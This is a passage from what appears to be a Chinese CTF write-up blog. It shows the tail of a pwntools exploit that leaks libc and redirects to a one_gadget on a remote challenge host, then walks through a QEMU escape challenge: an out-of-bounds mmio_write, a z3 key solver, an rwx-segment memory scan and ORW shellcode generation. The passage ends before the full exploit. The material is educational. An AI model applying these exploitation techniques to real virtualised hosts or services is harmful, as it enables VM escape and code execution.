gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;120.46.65.156&quot;</span>,<span class="number">32104</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x1409)\nb *$rebase(0x137A)\n&quot;</span>)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&quot;8d23w&quot;</span>) <span class="comment"># [10,15]d</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># aaaaaaaa pointer heap_addr libc_addr stack_addr</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 80 24 ee 19 2e 7f</span></span><br><span class="line"></span><br><span class="line">one_gadgets = [<span class="number">0xcbd1a</span>,<span class="number">0xcbd1d</span>,<span class="number">0xcbd20</span>,<span class="number">0xcbcba</span>,<span class="number">0xcbcbd</span>,<span class="number">0xcbcc0</span>]</span><br><span class="line"></span><br><span class="line">leak_addr = u64(ru(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">5</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">leak_addr = (leak_addr)+<span class="number">0x7f0000000000</span></span><br><span class="line">libc_base = leak_addr  - <span class="number">0x026d0a</span></span><br><span class="line">one_gadget = libc_base + one_gadgets[<span class="number">5</span>]</span><br><span class="line">system = libc_base + <span class="number">0x048e50</span></span><br><span class="line"></span><br><span class="line">offset = one_gadget - leak_addr</span><br><span class="line">offset2 = one_gadget - system</span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">success(<span class="string">&quot;offset &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(offset))</span><br><span class="line">success(<span class="string">&quot;offset2 &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(offset2))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&quot;7a&quot;</span>+<span class="built_in">str</span>(offset%<span class="number">0x100</span>)+<span class="string">&quot;w&quot;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&quot;d&quot;</span>+<span class="built_in">str</span>((offset&gt;&gt;<span class="number">8</span>)%<span class="number">0x100</span>)+<span class="string">&quot;w&quot;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&quot;d&quot;</span>+<span class="built_in">str</span>((offset&gt;&gt;<span class="number">16</span>)%<span class="number">0x100</span>)+<span class="string">&quot;w&quot;</span>)</span><br><span class="line">success(<span class="string">&quot;one_gadget &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span class="line">success(<span class="string">&quot;system &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&quot;7d&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="qemu-playground-2"><a href="#qemu-playground-2" class="headerlink" title="qemu playground - 2"></a>qemu playground - 2</h2><p>第一次打 qemu 逃逸类的题目，先查看 qemu 版本并恢复符号：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">QEMU emulator version <span class="number">8.1</span><span class="number">.50</span> (v8<span class="number">.1</span><span class="number">.0</span><span class="number">-1639</span>-g63011373ad-dirty)</span><br><span class="line">Copyright (c) <span class="number">2003</span><span class="number">-2023</span> Fabrice Bellard <span class="keyword">and</span> the QEMU Project developers</span><br></pre></td></tr></table></figure>
<ul>
<li><a target="_blank" rel="noopener" href="https://download.qemu.org/qemu-8.1.0.tar.xz">https://download.qemu.org/qemu-8.1.0.tar.xz</a></li>
</ul>
<p>下载后使用如下命令进行编译：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./configure</span><br><span class="line">make -j8</span><br></pre></td></tr></table></figure>
<p>利用 bindiff 和有符号的 qemu-system-x86_64 来恢复题目文件的符号</p>
<p><strong>漏洞分析</strong></p>
<p>qemu 逃逸一般在如下4个函数中出现 BUG：</p>
<ul>
<li>pmio_read：读设备寄存器的物理地址（使用 <code>in()</code> 触发）</li>
<li>pmio_write：写设备寄存器的物理地址（使用 <code>out()</code> 触发）</li>
<li>mmio_read：读设备寄存器的虚拟地址（使用 mmap 映射物理内存，读这片区域时触发） </li>
<li>mmio_write：写设备寄存器的虚拟地址（使用 mmap 映射物理内存，写这片区域时触发）</li>
</ul>
<p>MMIO：通过 kernel 提供的 sysfs，我们可以直接映射出设备对应的内存，具体方法是打开类似 <code>/sys/devices/pci0000:00/0000:00:04.0/resource0</code> 的文件 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>  mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">mmio = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>读写 mmio 内存区域就会触发 mmio_read / mmio_write</li>
</ul>
<p>PMIO：使用特殊的 CPU 指令 in/out 执行 I/O 操作，这些指令可以读/写 1,2,4 个字节（outb, outw, outl），通过 iopl 和 ioperm 这两个系统调用对 port 的权能进行设置</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iopl(<span class="number">3</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>使用 in/out 指令就会触发 pmio_read / pmio_write</li>
</ul>
<p>程序限制的边界为 addr &lt;= 0x40，可以覆盖堆指针后4字节：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">actf_mmio_write</span><span class="params">(Node *opaque, <span class="keyword">unsigned</span> __int64 addr, <span class="keyword">int</span> val, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr &gt; <span class="number">0x20</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr &lt;= <span class="number">0x40</span> )</span><br><span class="line">        *(<span class="keyword">int</span> *)((<span class="keyword">char</span> *)opaque-&gt;data1 + addr) = val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(<span class="keyword">int</span> *)((<span class="keyword">char</span> *)opaque-&gt;data1 + addr) = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序有 rwx 段：（不知道是题目设置的还是 qemu 自带的）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7f9bee400000</span>     <span class="number">0x7f9bee401000</span> ---p     <span class="number">1000</span> <span class="number">0</span>      [anon_7f9bee400]</span><br><span class="line"><span class="number">0x7f9bee4ce000</span>     <span class="number">0x7f9c2bfff000</span> rwxp <span class="number">3</span>db31000 <span class="number">0</span>      [anon_7f9bee4ce]</span><br><span class="line"><span class="number">0x7f9c2bfff000</span>     <span class="number">0x7f9c2c000000</span> ---p     <span class="number">1000</span> <span class="number">0</span>      [anon_7f9c2bfff]</span><br></pre></td></tr></table></figure>
<p>qemu 的调试需要先使用如下命令关闭保护：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sysctl kernel.yama.ptrace_scope=0</span><br></pre></td></tr></table></figure>
<p>然后使用 gdb attach pid 进行调试</p>
<p><strong>入侵思路</strong></p>
<p>为了使 <code>opaquet-&gt;field_A31 = 1</code> 成立，我们需要先进行逆向：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  *(_DWORD *)keyt = v2;</span><br><span class="line">  keyt = (<span class="keyword">char</span> *)keyt + <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( keyt != key2 );</span><br><span class="line">index = -(<span class="keyword">int</span>)data3;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  data1_head = &amp;data1;</span><br><span class="line">  keyt = key1;</span><br><span class="line">  data2 = _mm_loadu_si128((<span class="keyword">const</span> __m128i *)opaquet-&gt;data2);</span><br><span class="line">  data1 = _mm_loadu_si128((<span class="keyword">const</span> __m128i *)opaquet-&gt;data1);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    re = (<span class="keyword">unsigned</span> __int8)(*(_BYTE *)data1_head ^ data3-&gt;m128i_i8[<span class="number">0</span>]);</span><br><span class="line">    keyt = (<span class="keyword">char</span> *)keyt + <span class="number">1</span>;</span><br><span class="line">    v13 = *((<span class="keyword">char</span> *)keyt - <span class="number">1</span>) ^ (index + (_BYTE)data3);</span><br><span class="line">    data3 = (<span class="keyword">const</span> __m128i *)((<span class="keyword">char</span> *)data3 + <span class="number">1</span>);</span><br><span class="line">    data1_head = (<span class="keyword">char</span> *)data1_head + <span class="number">1</span>;</span><br><span class="line">    *((<span class="keyword">char</span> *)keyt - <span class="number">1</span>) = v13;</span><br><span class="line">    *((<span class="keyword">char</span> *)data1_head - <span class="number">1</span>) = v13 ^ re;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( keyt != key2 );</span><br><span class="line">  data1 = _mm_load_si128(&amp;data1);</span><br><span class="line">  LOBYTE(index) = index + <span class="number">0x11</span>;</span><br><span class="line">  data2 = _mm_load_si128(&amp;data2);</span><br><span class="line">  *data = _mm_loadu_si128(data3);</span><br><span class="line">  data[<span class="number">1</span>] = _mm_loadu_si128(data3 + <span class="number">1</span>);</span><br><span class="line">  *(__m128i *)opaquet-&gt;data3 = data1;</span><br><span class="line">  *(__m128i *)opaquet-&gt;data4 = data2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( (_BYTE)index != <span class="number">0xAA</span> - (_BYTE)data3 );</span><br><span class="line">key2[<span class="number">0</span>] = <span class="number">0xABA29EC2A98DD89A</span>LL;</span><br><span class="line">*((_QWORD *)&amp;cp + <span class="number">1</span>) = *(_QWORD *)opaquet-&gt;data1 ^ <span class="number">0xABA29EC2A98DD89A</span>LL;</span><br><span class="line">key2[<span class="number">1</span>] = <span class="number">0xBBF1B4AB81B4A9D4</span>LL;</span><br><span class="line">*(_QWORD *)&amp;cp = data-&gt;m128i_i64[<span class="number">1</span>] ^ <span class="number">0xBBF1B4AB81B4A9D4</span>LL;</span><br><span class="line">key2[<span class="number">2</span>] = <span class="number">0xFB92A48DB386FFA8</span>LL;</span><br><span class="line">key2[<span class="number">3</span>] = <span class="number">0xEFB491B8AFB4ABD3</span>LL;</span><br><span class="line"><span class="keyword">if</span> ( cp == <span class="number">0</span> &amp;&amp; !(key2[<span class="number">2</span>] ^ data[<span class="number">1</span>].m128i_i64[<span class="number">0</span>] | data[<span class="number">1</span>].m128i_i64[<span class="number">1</span>] ^ <span class="number">0xEFB491B8AFB4ABD3</span>LL) )</span><br><span class="line">&#123;</span><br><span class="line">  data1.m128i_i64[<span class="number">0</span>] = <span class="number">0x80EF69F1CBD00397</span>LL;</span><br><span class="line">  *((_QWORD *)&amp;cp + <span class="number">1</span>) = *(_QWORD *)opaquet-&gt;data3 ^ <span class="number">0x80EF69F1CBD00397</span>LL;</span><br><span class="line">  data1.m128i_i64[<span class="number">1</span>] = <span class="number">0xB2EB07859CDA52D3</span>LL;</span><br><span class="line">  *(_QWORD *)&amp;cp = data3-&gt;m128i_i64[<span class="number">1</span>] ^ <span class="number">0xB2EB07859CDA52D3</span>LL;</span><br><span class="line">  data2.m128i_i64[<span class="number">0</span>] = <span class="number">0xEC9E22F5A5A07FA3</span>LL;</span><br><span class="line">  data2.m128i_i64[<span class="number">1</span>] = <span class="number">0x4B36DF7B5B655A84</span>LL;</span><br><span class="line">  <span class="keyword">if</span> ( cp == <span class="number">0</span> &amp;&amp; !(data2.m128i_i64[<span class="number">0</span>] ^ data3[<span class="number">1</span>].m128i_i64[<span class="number">0</span>] | data3[<span class="number">1</span>].m128i_i64[<span class="number">1</span>] ^ <span class="number">0x4B36DF7B5B655A84</span>LL) )</span><br><span class="line">    opaquet-&gt;field_A31 = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">opaquet-&gt;field_A30 = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>加密的正向逻辑就是：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">code1</span>(<span class="params">index</span>):</span></span><br><span class="line">    <span class="keyword">global</span> key</span><br><span class="line">    <span class="keyword">global</span> data</span><br><span class="line">    tmp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        re = data[<span class="number">0</span>*<span class="number">0x10</span>+i] ^ data[<span class="number">2</span>*<span class="number">0x10</span>+i]</span><br><span class="line"></span><br><span class="line">        v13 = key[i] ^ ((i+index*<span class="number">0x11</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line">        key[i] = v13</span><br><span class="line">        data[i] = v13 ^ re</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        tmp.append(data[i+<span class="number">0x20</span>])</span><br><span class="line">        data[i+<span class="number">0x20</span>] = data[i]</span><br><span class="line">        data[i] = tmp[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    code1(i)</span><br></pre></td></tr></table></figure>
<p>我们可以直接用 z3 求解：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">data = [] <span class="comment"># 0x40</span></span><br><span class="line">key = [] <span class="comment"># 0x20</span></span><br><span class="line"></span><br><span class="line">x = Solver()</span><br><span class="line">data = [BitVec((<span class="string">&#x27;ans[%s]&#x27;</span> % i),<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x40</span>)] </span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>):</span><br><span class="line">    <span class="keyword">if</span> j % <span class="number">4</span> == <span class="number">0</span>:</span><br><span class="line">        key.append(<span class="number">0x7f</span>)</span><br><span class="line">    <span class="keyword">if</span> j % <span class="number">4</span> == <span class="number">1</span>:</span><br><span class="line">        key.append(<span class="number">0xac</span>)</span><br><span class="line">    <span class="keyword">if</span> j % <span class="number">4</span> == <span class="number">2</span>:</span><br><span class="line">        key.append(<span class="number">0x34</span>)</span><br><span class="line">    <span class="keyword">if</span> j % <span class="number">4</span> == <span class="number">3</span>:</span><br><span class="line">        key.append(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">code1</span>(<span class="params">index</span>):</span></span><br><span class="line">    <span class="keyword">global</span> key</span><br><span class="line">    <span class="keyword">global</span> data</span><br><span class="line">    tmp = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        re = data[<span class="number">0</span>*<span class="number">0x10</span>+i] ^ data[<span class="number">2</span>*<span class="number">0x10</span>+i]</span><br><span class="line"></span><br><span class="line">        v13 = key[i] ^ ((i+index*<span class="number">0x11</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line">        key[i] = v13</span><br><span class="line">        data[i] = v13 ^ re</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        tmp.append(data[i+<span class="number">0x20</span>])</span><br><span class="line">        data[i+<span class="number">0x20</span>] = data[i]</span><br><span class="line">        data[i] = tmp[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    code1(i)</span><br><span class="line"></span><br><span class="line">data2 = [<span class="number">0xABA29EC2A98DD89A</span>,<span class="number">0xBBF1B4AB81B4A9D4</span>,<span class="number">0xFB92A48DB386FFA8</span>,<span class="number">0xEFB491B8AFB4ABD3</span>,<span class="number">0x80EF69F1CBD00397</span>,<span class="number">0xB2EB07859CDA52D3</span>,<span class="number">0xEC9E22F5A5A07FA3</span>,<span class="number">0x4B36DF7B5B655A84</span>]</span><br><span class="line">code = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        code.append(((data2[i]&gt;&gt;(j*<span class="number">8</span>))&amp;<span class="number">0xff</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> code:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(i)),</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x40</span>):</span><br><span class="line">    x.add(data[i]==code[i])</span><br><span class="line"></span><br><span class="line">check = x.check()</span><br><span class="line">ans = []</span><br><span class="line">flag = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x40</span>):</span><br><span class="line">    ans.append(-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(ans)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(check):</span><br><span class="line">    model = x.model()</span><br><span class="line">    <span class="built_in">print</span>(model)</span><br></pre></td></tr></table></figure>
<p>得到解密密钥：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> data[<span class="number">0x10</span>] = &#123;<span class="number">1179927361</span>, <span class="number">860382075</span>, <span class="number">828328803</span>, <span class="number">1232559982</span>, <span class="number">1113548855</span>, <span class="number">1601790528</span>, <span class="number">1752183107</span>, <span class="number">1415541299</span>, <span class="number">1601447013</span>, <span class="number">1365208625</span>, <span class="number">1599425843</span>, <span class="number">2033478768</span>, <span class="number">1968124775</span>, <span class="number">828335182</span>, <span class="number">1095065380</span>, <span class="number">2099345747</span>&#125;;</span><br></pre></td></tr></table></figure>
<p>之后我尝试在 rwx 段上打断点，发现可以断上：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7f9bee4ce000</span>    push   rbp</span><br><span class="line">  <span class="number">0x7f9bee4ce001</span>    push   rbx</span><br><span class="line">  <span class="number">0x7f9bee4ce002</span>    push   r12</span><br></pre></td></tr></table></figure>
<p>然后利用堆上遗留的数据就可以很轻松地泄露 heap_base，由于 qemu heap 的偏移有随机化，只能扫描整个内存来尝试查找 rwx 段：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7f9bee4ce000</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rip <span class="number">0x7f9bee4ce000</span> ◂— push   rbp <span class="comment">/* 0x5641554154415355 */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x7f9bee4ce008</span> ◂— push   r15 <span class="comment">/* 0xc48148ef8b485741 */</span></span><br></pre></td></tr></table></figure>
<p>泄露的脚本如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> dump = <span class="number">0</span>;</span><br><span class="line">    mmio_write(<span class="number">0x40</span>, target_addr);</span><br><span class="line">    dump += pmio_read(<span class="number">0x10</span>);</span><br><span class="line">    mmio_write(<span class="number">0x40</span>, target_addr + <span class="number">4</span>);</span><br><span class="line">    dump += pmio_read(<span class="number">0x10</span>) * <span class="number">0x100000000</span>;</span><br><span class="line"></span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;%d: *(0x%x)=0x%lx \n&quot;</span>, i,target_addr,dump);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (dump == <span class="number">0x5641554154415355</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        shellcode_addr = target_addr;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;shellcode_addr &gt;&gt; 0x%x\n&quot;</span>, shellcode_addr);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    target_addr -= <span class="number">0x1000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后还要解决一个问题，rwx 段的执行频率很高（差不多每写一次都要执行一次），因此我们先在程序的正常代码后写入 shellcode</p>
<p>写好以后一次性覆盖程序的 ret 为 nop 从而执行 shellcode，下面是生成 shellcode 的代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_open = shellcraft.pushstr(<span class="string">&quot;flag&quot;</span>) + shellcraft.<span class="built_in">open</span>(<span class="string">&quot;rsp&quot;</span>)</span><br><span class="line">shellcode_read = shellcraft.read(<span class="string">&quot;rax&quot;</span>,<span class="string">&quot;rsp&quot;</span>,<span class="number">60</span>)</span><br><span class="line">shellcode_write = shellcraft.write(<span class="number">1</span>,<span class="string">&quot;rsp&quot;</span>,<span class="number">60</span>)</span><br><span class="line">shellcode= asm(shellcode_open+shellcode_read+shellcode_write)</span><br><span class="line"></span><br><span class="line">data = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> shellcode:</span><br><span class="line">    data += <span class="string">&quot;,&quot;</span>+<span class="built_in">hex</span>(i) </span><br><span class="line"></span><br><span class="line">data = <span class="string">&quot;&#123;&quot;</span> + data[<span class="number">1</span>:] + <span class="string">&quot;&#125;;&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;shellcode.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(data)</span><br></pre></td></tr></table></figure>
<ul>
<li>由于 <code>execve(&quot;/bin/sh&quot;)</code> 没有交互，我这里只能写 ORW</li>
</ul>
<p>完整 exp 如下：</p>
